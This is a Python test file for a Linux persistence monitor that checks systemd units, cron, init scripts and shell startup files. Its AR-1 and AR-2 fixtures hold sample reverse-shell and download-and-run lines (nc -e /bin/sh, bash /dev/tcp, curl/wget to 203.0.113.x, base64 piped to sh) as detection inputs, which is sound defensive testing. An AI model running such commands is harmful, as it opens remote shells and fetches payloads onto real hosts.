"""
tests/test_autorun_monitor_fixes.py — register section 7, the autoruns round.

2026-09-24. Every defect in bugfinder.md AR-1..AR-12 gets an assertion here,
BOTH DIRECTIONS wherever the fix is a detector or a refusal, because a detector
that stops firing is as broken as one that fires on everything -- and this
round's headline defect was exactly the second kind.

The module is driven unmodified. Nothing here writes to the owner's database:
the write-path checks build their own store from Schema.SQL and point
AGENTALSEC_TEST_DB at it.
"""
import json
import os
import pathlib
import re
import sqlite3
import subprocess
import sys
import tempfile

HERE = pathlib.Path(__file__).resolve().parent
ROOT = HERE.parent
sys.path.insert(0, str(ROOT))

# NOT THE OWNER'S DATABASE.
# The write-path checks below call me.save_finding, and without this the store
# they would write into is the one beside main.py.
_DB = pathlib.Path(tempfile.mkdtemp()) / "autorun_test.db"
_conn = sqlite3.connect(_DB)
_conn.executescript((ROOT / "Schema.SQL").read_text())
_conn.commit()
_conn.close()
os.environ["AGENTALSEC_TEST_DB"] = str(_DB)

from core import memory_engine as me        # noqa: E402
from core import sensors as sn              # noqa: E402
from core import detections as det          # noqa: E402
from tools import autorun_monitor as am     # noqa: E402

me.upsert_sensor(sn.LOCAL_SENSOR_ID, "host", "this machine", "other machines")

PASS, FAIL = [], []


def check(label: str, got, want) -> None:
    ok = got == want
    (PASS if ok else FAIL).append(label)
    print(f"  {'PASS' if ok else 'FAIL'}  {label}")
    if not ok:
        print(f"          got  {got!r}")
        print(f"          want {want!r}")


def check_true(label: str, got) -> None:
    check(label, bool(got), True)


print("[AR-1] THE MATCHER IS TOKEN-WISE, AND THE 151 FALSE FINDINGS ARE GONE")

# The shapes that produced 150 of the 151 false findings, measured on this host.
_quiet = [
    ("DefaultDependencies=no", "nc"),               # 111 units
    ("Description=Run anacron jobs", "nc"),
    ("synchronized", "nc"),                          # 4 units
    ("ConditionCapability=CAP_SYS_ADMIN", "nc"),     # 4 units
    ("Description=uncomplicated", "nc"),
    ("# set a fancy prompt (non-color)", "nc"),
    ("alias alert='notify-send --urgency=low'", "nc"),
    ("include .bashrc if it exists", "nc"),
    ("Documentation=man:systemctl-stop(1)", "systemctl stop"),
]
for text, pat in _quiet:
    pats = [(p, m, w) for p, m, w in am.SUSPICIOUS_PATTERNS if p == pat]
    check(f"quiet: {pat!r} does not fire on {text[:40]!r}",
          am._pattern_hits(text, pats), [])

# ... and the TRUE shapes still fire, or the fix would be a blindfold.
_loud = [
    ("ExecStart=/usr/bin/nc -e /bin/sh 203.0.113.5 4444", "nc"),
    ("ExecStart=/bin/nc -l -p 9001", "nc"),
    ("ExecStart=/usr/bin/ncat 203.0.113.9 4444", "ncat"),
    ("ExecStart=/usr/bin/curl -s http://203.0.113.9/x.sh", "curl"),
    ("ExecStart=/bin/bash -i", "bash -i"),
    ("ExecStart=/usr/bin/wget http://203.0.113.9/a", "wget"),
    ("ExecStart=/bin/sh -c 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'",
     "/dev/tcp/"),
    ("ExecStart=/usr/bin/python3 -c 'import socket'", "python3 -c"),
    ("ExecStart=/bin/sh -c 'base64 -d <<< abc | sh'", "base64 -d"),
    ("ExecStart=/usr/sbin/ufw disable", "ufw disable"),
]
for text, pat in _loud:
    pats = [(p, m, w) for p, m, w in am.SUSPICIOUS_PATTERNS if p == pat]
    got = am._pattern_hits(text, pats)
    check(f"fires: {pat!r} matches {text[:44]!r}", len(got), 1)
    check(f"fires: it names the line it matched (line 1)",
          got[0]["line"] if got else None, 1)

print()
print("[AR-2] A UNIT IS JUDGED ON ITS EXECUTIVE LINES, NOT ITS PROSE")

_unit = ("[Unit]\n"
         "Description=Run anacron jobs\n"
         "DefaultDependencies=no\n"
         "Documentation=man:curl(1)\n"
         "[Service]\n"
         "Type=oneshot\n"
         "ExecStart=/usr/bin/nc -l -p 9001\n")
check("prose is excluded, the exec line is kept",
      am._unit_exec_text(_unit).strip(),
      "ExecStart=/usr/bin/nc -l -p 9001")
check("so the pattern scan finds exactly one hit",
      [h["pattern"] for h in am._pattern_hits(am._unit_exec_text(_unit))],
      ["nc"])
# ... and a unit whose only match is prose raises nothing at all.
_prose_only = "[Unit]\nDescription=Run anacron jobs\nDefaultDependencies=no\n"
check("a unit matching only in prose raises nothing",
      am._pattern_hits(am._unit_exec_text(_prose_only)), [])
# a comment IS reported, and marked as one.
_commented = "[Service]\n# ExecStart=/usr/bin/curl 203.0.113.9\n"
_c = am._pattern_hits(am._unit_exec_text(_commented))
check("a commented exec line is reported", len(_c), 1)
check("...and marked as commented", _c[0]["commented"] if _c else None, True)

print()
print("[AR-3] THE FOOTER IS NOT A UNIT, AND THE FIRST UNIT IS NOT DROPPED")

_rows = am.get_systemd_services()
_names = [s["name"] for s in _rows]
check_true("no entry called '261' (the footer line)", "261" not in _names)
check_true("every name ends in .service",
           all(n.endswith(".service") for n in _names))
_raw = subprocess.run(
    ["systemctl", "list-unit-files", "--type=service", "--all", "--no-pager",
     "--no-legend"], capture_output=True, text=True).stdout
_true = [l.split()[0] for l in _raw.strip().split("\n")
         if l.strip() and l.split()[0].endswith(".service")]
check("the count matches systemd's own list", len(_names), len(_true))
_missing = sorted(set(_true) - set(_names))
check_true(f"nothing systemd lists is missing (accounts-daemon is the one "
           f"the old slice ate); missing={_missing}", not _missing)

print()
print("[AR-4] EVERY UNIT CARRIES THE COMMAND IT RUNS")

_with_cmd = [s for s in _rows if s.get("command")]
check_true("most units have a command", len(_with_cmd) > 150)
_acct = [s for s in _rows if s["name"] == "accounts-daemon.service"]
check("accounts-daemon's command is its program, not a filename",
      _acct[0]["command"] if _acct else None, "/usr/libexec/accounts-daemon")
_anacron = [s for s in _rows if s["name"] == "anacron.service"]
check("anacron's command is the argv systemd reports",
      _anacron[0]["command"] if _anacron else None,
      "/usr/sbin/anacron -d -q $ANACRON_ARGS")
# AND THE PATH KEEPS ITS OWN NAME, so a caller can still find the file.
check("the unit file is still named, separately",
      _anacron[0]["path"] if _anacron else None,
      "/usr/lib/systemd/system/anacron.service")

print()
print("[AR-5] ALIASES RESOLVE AND TEMPLATES ARE NAMED, NOT SILENTLY DROPPED")

_cov = am.get_systemd_services.coverage
check("every askable unit got an answer",
      _cov["units_the_manager_did_not_answer_for_count"], 0)
check("and the count of answered units is the count asked",
      _cov["units_answered"], _cov["units_asked"])
check_true("template names are counted and named as skipped",
           _cov["template_names_skipped"] > 0)
_sshd = [s for s in _rows if s["name"] == "sshd.service"]
check_true("an alias (sshd.service -> ssh.service) resolves to a path",
           bool(_sshd and _sshd[0]["path"]))
check_true("and systemd's own state travels with it",
           bool(_sshd and _sshd[0]["state"]))

print()
print("[AR-6] THE USER MANAGER'S UNITS ARE READ AT ALL")

_users = am.get_user_units()
check_true("user units are found on this host", len(_users) >= 1)
_home = os.path.expanduser("~")
check_true("a unit from ~/.config/systemd/user is among them",
           any(u["path"].startswith(_home) for u in _users))
_hermes = [u for u in _users if u["name"] == "hermes-gateway.service"]
if _hermes:
    check_true("its ExecStart is carried",
               "gateway run" in (_hermes[0].get("command") or ""))
    check("an enabled user unit names the want-link that enables it",
          _hermes[0]["wanted_by"], ["default.target.wants"])
# A FILE IN A DIRECTORY IS NOT ENABLED. A unit with no want-link says so.
_unwanted = [u for u in _users if not u["wanted_by"]]
if _unwanted:
    check("a user unit with no want-link reports no link, not 'enabled'",
          _unwanted[0]["wanted_by"], [])

print()
print("[AR-7] CRON: A SCHEDULE IS A SCHEDULE, AND A SCRIPT IS NOT A CRONTAB")

check("a five-field line parses to its five fields",
      (am._parse_crontab_line("17 * * * * root cd / && run-parts /etc/cron.hourly")
       or {}).get("schedule"), "17 * * * *")
check("an @keyword line parses to its keyword",
      (am._parse_crontab_line("@reboot root /usr/local/bin/start.sh")
       or {}).get("schedule"), "@reboot")
for _junk in ("SHELL=/bin/sh", 'MAILTO=""', "PATH=/usr/local/sbin:/usr/bin",
              "bak=/var/backups", "# a comment", "",
              "if test -f /var/lib/aptitude/pkgstates ; then", "fi"):
    check(f"not a job: {_junk[:38]!r}",
          am._parse_crontab_line(_junk), None)

_jobs = am.get_cron_jobs()
_sched = {j.get("schedule") for j in _jobs}
check_true("no job reports the literal string 'system' as its schedule",
           "system" not in _sched)
check_true("run-parts entries are typed as run_parts, not as cron jobs",
           any(j.get("type") == "run_parts" for j in _jobs))
# THE SCHEDULED CRONTAB ENTRIES must not be lines of a script body. A run-parts
# entry IS a script and carries its first code line as a summary ON PURPOSE, so
# the assertion is scoped to the two crontab types -- which is where reading a
# script body as a job list was the defect.
_cron_entries = [j for j in _jobs if j.get("type") in ("system_cron",
                                                       "user_cron")]
check_true(f"no crontab entry is a line of a script body "
           f"(checked {len(_cron_entries)})",
           not any((j.get("command") or "").strip().startswith(
               ("if ", "fi", "then", "set -e", "test -x"))
               for j in _cron_entries))
check_true("and no crontab entry is an environment assignment",
           not any("=" in (j.get("command") or "").split(" ")[0]
                   and " " not in (j.get("command") or "").strip()
                   for j in _cron_entries))

print()
print("[AR-8] A REFUSAL TO LOOK IS REPORTED, NOT RETURNED AS A ZERO")

_spool = getattr(am.get_cron_jobs, "user_spool", {})
check_true("the per-user crontab spool is reported", bool(_spool.get("path")))
if not os.access("/var/spool/cron/crontabs", os.R_OK | os.X_OK):
    check("an unreadable spool is recorded as unreadable",
          _spool.get("readable"), False)
    check_true("and the refusal is carried in words",
               "PermissionError" in (_spool.get("refusal") or ""))
    # ... and the two directions: zero entries here means NOT LOOKED AT.
    check("zero user-cron entries alongside a refusal is a hole, not a clean",
          _spool.get("entries"), 0)
else:
    check("a readable spool says readable", _spool.get("readable"), True)

print()
print("[AR-9] INIT SCRIPTS: THE PROMISED FIELDS EXIST, AND runlevels IS REAL")

_init = am.get_init_scripts()
check_true("init scripts are found", len(_init) > 0)
check_true("every one carries the hash its docstring promised",
           all(i.get("hash") for i in _init))
check_true("every one carries an owner read from the file",
           all(i.get("owner") for i in _init))
check_true("every one carries a mode",
           all(i.get("mode") for i in _init))
check_true("runlevels is a list on every one",
           all(isinstance(i.get("runlevels"), list) for i in _init))
# The measured case: all 33 on this host ARE linked, so at least one must be.
check_true("at least one script is linked into an rc*.d",
           any(i.get("runlevels") for i in _init))

print()
print("[AR-10] THE BASELINE: ADDED, CHANGED AND REMOVED ENTRIES ARE SEEN")

_tmp = pathlib.Path(tempfile.mkdtemp())
_gone = str(_tmp / "gone.service")
_locked = _tmp / "locked.service"
_locked.write_text("x")
_locked.chmod(0)


def _e(path, fp, detail=None):
    return {"kind": "systemd_service", "name": pathlib.Path(path).name,
            "path": path, "fingerprint": fp, "detail": detail}


_first = {"s:a": _e(str(_tmp / "a.service"), "1", "/bin/a"),
          "s:gone": _e(_gone, "2"),
          "s:locked": _e(str(_locked), "3")}
_r = am.check_for_changes(_first)
check("the first check records a baseline and claims nothing",
      (_r["first_run"], _r["added"], _r["removed"]), (True, [], []))
check("and it is stored", len(am.load_baseline() or {}), 3)

_second = {"s:a": _e(str(_tmp / "a.service"), "9", "/bin/evil"),
           "s:new": _e(str(_tmp / "new.service"), "4", "/bin/new")}
_r = am.check_for_changes(_second)
check("a new entry is added", [x["entry_key"] for x in _r["added"]], ["s:new"])
check("a changed entry is changed, with what it was",
      [(x["entry_key"], x["was"]) for x in _r["changed"]], [("s:a", "/bin/a")])
check("a deleted file is removed", [x["entry_key"] for x in _r["removed"]], ["s:gone"])
check("an unreadable one is kept, not called removed", _r["kept_unreadable"], 1)

_r = am.check_for_changes(_second)
check("a change is reported once", (_r["added"], _r["changed"], _r["removed"]),
      ([], [], []))

_f = am.change_findings({"added": [{**_second["s:new"]}], "removed": [],
                         "changed": []})
check("a change becomes a finding the adapter can file",
      (_f[0]["type"], _f[0]["severity"]), ("autorun_entry_added", "medium"))
# Enabling a unit changes its fingerprint but not its command.
_same = {"kind": "systemd_service", "name": "demo.service", "path": "/x",
         "detail": "/usr/bin/demo -d", "was": "/usr/bin/demo -d"}
_f = am.change_findings({"added": [], "removed": [], "changed": [_same]})
check_true("a same-command change says the boot setting changed",
           "whether it starts at boot" in _f[0]["description"]
           and "(was:" not in _f[0]["description"])
_f = am.change_findings({"added": [], "removed": [], "changed": [
    {**_same, "was": "/usr/bin/demo -x"}]})
check_true("a real command change still shows the old command",
           "(was: /usr/bin/demo -x)" in _f[0]["description"])
check_true("memory_engine still has no save_baseline (the old call site)",
           not hasattr(me, "save_baseline"))
_locked.chmod(0o600)
with me._get_conn() as _c:
    _c.execute("DELETE FROM autorun_baseline")

print()
print("[AR-11] $USER IS NOT AN ANSWER: THE OWNER COMES FROM THE FILE")

_shell = am.get_shell_startup()
check_true("shell startup files are found", len(_shell) > 0)
check_true("each carries an owner",
           all(s.get("user") for s in _shell))
# The measured defect: with USER unset (systemd), the old code said "unknown".
_env = dict(os.environ)
_env.pop("USER", None)
_code = ("import sys; sys.path.insert(0, %r);"
         "from tools import autorun_monitor as am;"
         "import json; print(json.dumps([s['user'] for s in "
         "am.get_shell_startup()]))" % str(ROOT))
_r = subprocess.run([sys.executable, "-c", _code], capture_output=True,
                    text=True, env=_env, cwd=str(ROOT))
_owners = json.loads((_r.stdout.strip().splitlines() or ["[]"])[-1])
check_true("with $USER UNSET the owner is still a real account, not 'unknown'",
           _owners and all(o and o != "unknown" for o in _owners))

print()
print("[AR-12] THE PAYLOAD SAYS WHAT IT IS AND WHAT IT COULD NOT SEE")

import adapters                              # noqa: E402

_ad = adapters.LinuxAutorunMonitor(
    "test-session",
    {"sensors": {"autorun_monitor": {"enabled": True, "poll_interval": 3600}}})
_out = _ad.collect()
check("the fresh payload is not marked cached", _out.get("cached"), False)
check_true("it carries a coverage block", bool(_out.get("coverage")))
check_true("the coverage names the systemd refusals",
           _out["coverage"]["systemd"]["units_asked"] > 0)
check_true("the coverage names the per-user cron position",
           "user_cron" in _out["coverage"])
_again = _ad.collect()
check("the second read IS marked cached", _again.get("cached"), True)
check_true("and it states its age",
           isinstance(_again.get("cached_age_seconds"), (int, float)))
check_true("the adapter declares the role save_finding writes under",
           _ad.role == "registry_monitor")
check_true("the adapter honours the config TTL rather than a bare 3600",
           _ad.CACHE_TTL == 3600)

print()
print("[AR-2b] THE WRITE PATH: FINDINGS REACH THE EVIDENCE STORE")

_tally = _ad.poll()
check_true("a pass writes the findings it raised",
           _tally["written"] >= 1)
check("nothing was dropped as unregistered",
      _tally["unregistered"], {})
check("nothing failed to write", _tally["failed"], {})
_conn = sqlite3.connect(str(_DB))
_rows = _conn.execute(
    "SELECT detection_id, severity, entity_type, source FROM findings"
).fetchall()
check_true("the rows are in the store", len(_rows) >= 1)
check_true("each row names a registered detection id",
           all(r[0] in ("LNX-4001", "LNX-4002", "LNX-4003", "LNX-4004",
                       "LNX-4005", "LNX-4006") for r in _rows))
check_true("each row is filed under this sensor's source",
           all(r[3] == "registry_monitor" for r in _rows))
check_true("each row is keyed on a file, which both vocabularies accept",
           all(r[2] == "file" for r in _rows))

_before = _conn.execute("SELECT COUNT(*) FROM findings").fetchone()[0]
_tally2 = _ad.poll()
_after = _conn.execute("SELECT COUNT(*) FROM findings").fetchone()[0]
check("a second pass adds NO duplicate rows", _after, _before)
check_true("and it counts them as already-open rather than as failures",
           _tally2["already_open"] >= 1)

# BOTH DIRECTIONS on the write path: a dismissed entity is not re-raised.
_first = _rows[0]
me.dismiss_entity("file", _conn.execute(
    "SELECT entity_value FROM findings LIMIT 1").fetchone()[0])
_tally3 = _ad.poll()
check_true("a dismissed entity is counted as dismissed, not written",
           _tally3["dismissed"] >= 1)

print()
print("[AR-REG] THE THREE IDS ARE REGISTERED, WITH THE SOURCE THIS SENSOR USES")

for _id, _want_sev in (("LNX-4001", {"medium"}),
                       ("LNX-4002", {"medium"}),
                       ("LNX-4003", {"low", "medium"})):
    _rule = det.get(_id)
    check(f"{_id} is registered", _rule is not None, True)
    check(f"{_id} names this sensor as its source",
          _rule.source, "registry_monitor")
    check(f"{_id} declares {sorted(_want_sev)}",
          set(_rule.severities), _want_sev)
# The adapter's type->id map covers every type the module can raise.
_types = {"suspicious_systemd_service", "suspicious_cron_job",
          "suspicious_shell_startup"}
check("every finding type the module raises has an id in the adapter",
      sorted(set(adapters.LinuxAutorunMonitor.FINDING_IDS) & _types),
      sorted(_types))

print()
print("[AR-1b] WHAT THE TOKEN RULE DOES NOT FIX, ASSERTED SO IT IS NOT HIDDEN")

# A TOKEN-WISE MATCH IS NOT A WORD-SENSE FILTER, and this is the residual
# honestly: "curl" is a legal English noun, so `Description=A curl of the
# stats` still matches -- and on a UNIT that phrase sits in prose, which the
# matcher now excludes, so the two fixes together cover it. On a SHELL STARTUP
# FILE there is no prose/exec split (every line can run), so a comment or a
# sentence containing the bare word can still match. That is recorded as a
# residual rather than asserted away: the finding quotes the line and the
# reader can see it is prose, which is why it is medium and not high.
_curl_pats = [(p, m, w) for p, m, w in am.SUSPICIOUS_PATTERNS if p == "curl"]
check("a bare English use of 'curl' still matches on a line that could run",
      len(am._pattern_hits("A curl of the data", _curl_pats)), 1)
check("...and the hit quotes the line so the reader can judge it",
      am._pattern_hits("A curl of the data", _curl_pats)[0]["content"],
      "A curl of the data")
# WHAT THIS DOES NOT CHANGE: on a unit, the same phrase is prose and is gone.
check("the same phrase in unit prose matches nothing",
      am._pattern_hits(am._unit_exec_text(
          "[Unit]\nDescription=A curl of the data\n")), [])

print()
print("[AR-SEC] THE SECURITY POSTURE OF THE MODULE ITSELF")

_src = (ROOT / "tools" / "autorun_monitor.py").read_text()
check("no shell=True anywhere", "shell=True" in _src, False)
check("no eval(", bool(re.search(r"(?<![\w.])eval\(", _src)), False)
check("no pickle", "pickle" in _src, False)
check("no os.system", "os.system" in _src, False)
# Every subprocess is an argument list.
_calls = re.findall(r"subprocess\.run\(\s*(\[|\()", _src)
check_true("every subprocess.run is called with an argument list",
           _calls and all(c == "[" for c in _calls))
# THE MODULE IS READ-ONLY: no writable open, no chmod, no rename.
_readonly_probes = [
    (r"open\([^)]*[\"'][wax]", "a writable or append-mode open"),
    (r"os\.chmod", "os.chmod"),
    (r"os\.chown", "os.chown"),
    (r"shutil\.", "shutil (copy/move/remove live there)"),
    (r"os\.remove", "os.remove"),
    (r"os\.rename", "os.rename"),
    (r"os\.utime", "os.utime"),
]
for _pattern, _what in _readonly_probes:
    check(f"read-only: no {_what}", bool(re.search(_pattern, _src)), False)

print()
print("[AR-DESC] THE TOOL DESCRIPTION NO LONGER CLAIMS A REGISTRY")

_tr = (ROOT / "core" / "tool_registry.py").read_text()
_i = _tr.find('"name": "query_autoruns"')
_desc = _tr[_i:_i + 3600]
check("it does not describe Windows registry keys",
      "Windows registry persistence locations" in _desc, False)
check("it says the answer is Linux's own mechanisms",
      "PERSISTENCE ON THIS LINUX HOST" in _desc, True)
check("it names the coverage block as part of the answer",
      "COVERAGE BLOCK" in _desc, True)
check("it warns that a cached answer may be returned",
      "cached: true" in _desc, True)

print()
print("[AR-LOOP] THE AGENT'S OWN SYSTEM PROMPT CLAIM IS NOW TRUE")

_al = (ROOT / "core" / "agent_loop.py").read_text()
_i = _al.find("PERSISTENCE DETECTION EXISTS")
_claim = _al[_i:_i + 700]
check("it claims systemd user units are read",
      "systemd units (system and user)" in _claim, True)
check_true("and this round made that claim true, which it was not before "
           "(the module read no user unit at all)",
           len(am.get_user_units()) >= 1)

print()
print("[AR-12] THE OFF SWITCH REFUSES THE CALL (owner's answer, 2026-09-24)")

# `sensors.autorun_monitor.enabled` was documented and read by nothing. The
# owner chose the second design offered: keep the sensor pull-only and make the
# switch REFUSE, rather than give it a background clock that would write rows
# into the owner's evidence store on a schedule. Both directions are asserted here,
# because a switch that refuses everything is as broken as one that refuses
# nothing.
_OFF_CFG = {"sensors": {"autorun_monitor": {"enabled": False,
                                            "poll_interval": 3600}}}
_ON_CFG = {"sensors": {"autorun_monitor": {"enabled": True,
                                           "poll_interval": 3600}}}
# Kept before the instrumented pass below, so the module is put back exactly as
# it was found. A test that leaves a monkeypatched module behind would make
# every later check in this file a measurement of the patch.
_ORIGINALS = {_fn: getattr(am, _fn) for _fn in
              ("get_systemd_services", "get_cron_jobs", "get_init_scripts",
               "get_shell_startup", "get_user_units")}

_ad_off = adapters.LinuxAutorunMonitor("off-session", _OFF_CFG)
_r_off = _ad_off.collect()
check("switched off: nothing is returned", _r_off["count"], 0)
check("switched off: no entries", _r_off["entries"], [])
check("switched off: no findings", _r_off["findings"], [])
check("switched off: the payload says so by name",
      _r_off.get("off_by_config"), True)
check_true("switched off: the note refuses to be read as a clean machine",
           "NOT A CLEAN MACHINE" in (_r_off.get("note") or ""))
check_true("switched off: the note names the exact config key",
           "sensors.autorun_monitor.enabled" in (_r_off.get("note") or ""))
check_true("switched off: the note says how to turn it back on",
           "config.json" in (_r_off.get("note") or ""))
# The shape a caller already handles, so nothing crashes on the refusal. It is
# a SUPERSET of the working payload's keys and not an equal set, because the
# refusal adds `off_by_config` -- which is the key a caller needs to tell this
# answer from a real empty one.
check("switched off: the refusal carries every key the working answer does",
      sorted(set(adapters.LinuxAutorunMonitor("x", _ON_CFG).collect().keys())
             - set(_r_off.keys())),
      [])
# AND IT READ NOTHING. Instrumented: not one enumerator may run while off.
_calls = []
for _fn in ("get_systemd_services", "get_cron_jobs", "get_init_scripts",
            "get_shell_startup", "get_user_units"):
    _orig = getattr(am, _fn)

    def _make(_orig=_orig, _fn=_fn):
        def _wrapper(*a, **k):
            _calls.append(_fn)
            return _orig(*a, **k)
        return _wrapper
    setattr(am, _fn, _make())
adapters.LinuxAutorunMonitor("off-session", _OFF_CFG).collect()
check("switched off: NOT one enumerator was called", _calls, [])
_calls.clear()
check("switched off: poll() honours it too",
      adapters.LinuxAutorunMonitor("off-session", _OFF_CFG).poll(),
      {"written": 0, "off_by_config": True})
check("switched off: poll() read nothing either", _calls, [])
# put the module back
for _fn in ("get_systemd_services", "get_cron_jobs", "get_init_scripts",
            "get_shell_startup", "get_user_units"):
    setattr(am, _fn, _ORIGINALS[_fn])

# the status carries it, so the readiness page shows switched-off not healthy
_st_off = adapters.LinuxAutorunMonitor("off-session", _OFF_CFG).status()
check("switched off: status carries off_by_config",
      _st_off.get("off_by_config"), True)
check("switched off: status reports enabled false",
      _st_off.get("enabled"), False)
check_true("switched off: the status note says it too",
           "SWITCHED OFF IN CONFIG" in (_st_off.get("note") or ""))

# THE PAGE HAS TO SEE IT TOO, or the control's own row contradicts it. This is
# not cosmetic: core/settings._module_row picks its verdict with
# `st.get("running", st.get("ready", st.get("available")))`, so a dict that
# keeps `ready: True` paints the row GREEN and says "running." beside the note
# that says the sensor is switched off. MEASURED before the correction:
# `state: "ok", detail: "running."` under the switched-off sentence.
from core import settings as _settings      # noqa: E402
from core import sensor_health as _sh       # noqa: E402
_row = _settings._module_row("registry_monitor",
                             adapters.LinuxAutorunMonitor("off-session",
                                                          _OFF_CFG))
check("switched off: the page renders it as OFF, not as healthy",
      _row.get("state"), "off")
check_true("switched off: the page's detail names the switch",
           "switched OFF in config" in (_row.get("detail") or ""))
check_true("switched off: the page's detail names the key",
           "sensors.autorun_monitor.enabled" in (_row.get("detail") or ""))
# ... and the ON direction renders healthy, or the fix would be a blindfold.
_row_on = _settings._module_row(
    "registry_monitor", adapters.LinuxAutorunMonitor("on-session", _ON_CFG))
check("switched ON: the page renders it as ok, not as off",
      _row_on.get("state"), "ok")
# A TOOL WHOSE ANSWER RESTS ON A SWITCHED-OFF SENSOR SAYS SO, so the model is
# told the emptiness is the operator's choice rather than a clean machine.
check_true("switched off: query_autoruns' dependencies report the switch",
           any("switched OFF" in w for w in
               _sh.warnings_for("query_autoruns",
                                {"registry_monitor": adapters.LinuxAutorunMonitor(
                                    "off-session", _OFF_CFG)})))
check("switched ON: the same dependencies report nothing",
      _sh.warnings_for("query_autoruns",
                       {"registry_monitor": adapters.LinuxAutorunMonitor(
                           "on-session", _ON_CFG)}), [])

# THE OTHER DIRECTION, or the switch is a blindfold.
_ad_on = adapters.LinuxAutorunMonitor("on-session", _ON_CFG)
_r_on = _ad_on.collect()
check_true("switched ON: the sensor still reads", _r_on["count"] > 100)
check("switched ON: it does not claim to be off",
      _r_on.get("off_by_config"), None)
check("switched ON: status reports enabled true",
      _ad_on.status().get("enabled"), True)
# AN ABSENT KEY IS ON, which is what every other sensor in the tree does, and
# it is the reason a config written before this round still works.
for _label, _cfg in (("an empty autorun_monitor block", {"sensors": {
                        "autorun_monitor": {}}}),
                     ("a sensors block without it", {"sensors": {}}),
                     ("no config at all", None)):
    _r = adapters.LinuxAutorunMonitor("s", _cfg).collect()
    check_true(f"an absent enabled key means ON: {_label}",
               _r["count"] > 100 and not _r.get("off_by_config"))
# AND THE TTL STILL COMES FROM poll_interval, the key that CAN mean something
# on a pull-only sensor.
check("poll_interval is the cache lifetime",
      adapters.LinuxAutorunMonitor(
          "s", {"sensors": {"autorun_monitor": {"poll_interval": 900}}}).CACHE_TTL,
      900)

print()
print("[AR-10b] A CHANGE SEEN BY query_autoruns IS FILED, NOT JUST SHOWN")

with me._get_conn() as _c:
    _c.execute("DELETE FROM autorun_baseline")
    _c.execute("INSERT OR REPLACE INTO autorun_baseline(entry_key, kind, name, "
               "path, fingerprint) VALUES('init_script:/etc/init.d/gone-test', "
               "'init_script', 'gone-test', '/etc/init.d/gone-test', 'x')")
# Stubbed enumerators: the real ones were read above, and a second full
# read here would cost the runner's whole time budget.
_real = {n: getattr(am, n) for n in ("get_systemd_services", "get_user_units",
                                     "get_cron_jobs", "get_init_scripts",
                                     "get_shell_startup", "analyze_suspicious")}
for _n in _real:
    setattr(am, _n, lambda: [])
_ad2 = adapters.LinuxAutorunMonitor(
    "test-session", {"sensors": {"autorun_monitor": {"enabled": True}}})
_out = _ad2.collect(refresh=True)
for _n, _f in _real.items():
    setattr(am, _n, _f)
check_true("the payload counts the removal", _out["changes"].get("removed", 0) >= 1)
_n = sqlite3.connect(str(_DB)).execute(
    "SELECT COUNT(*) FROM findings WHERE detection_id='LNX-4006' "
    "AND entity_value='/etc/init.d/gone-test'").fetchone()[0]
check("and it is in the findings table", _n, 1)

print()
print(",," * 30)
print(f"{len(PASS)} passed, {len(FAIL)} failed")
if FAIL:
    for f in FAIL:
        print(f"  FAILED: {f}")
    sys.exit(1)
